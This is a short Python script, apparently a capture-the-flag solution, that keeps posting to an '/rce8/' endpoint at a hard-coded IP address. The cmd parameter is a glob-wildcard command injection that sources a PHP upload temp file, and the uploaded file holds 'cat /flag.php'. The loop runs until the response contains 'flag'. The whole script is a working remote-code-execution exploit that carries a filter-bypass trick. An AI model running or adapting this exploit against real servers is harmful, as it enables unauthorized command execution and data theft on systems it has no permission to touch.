import requests

while True:
    url = "http://122.51.52.109:7001/rce8/?cmd=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('feng.txt', b'cat /flag.php')})
    if r.text.find("flag") > 0:
        print(r.text)
        break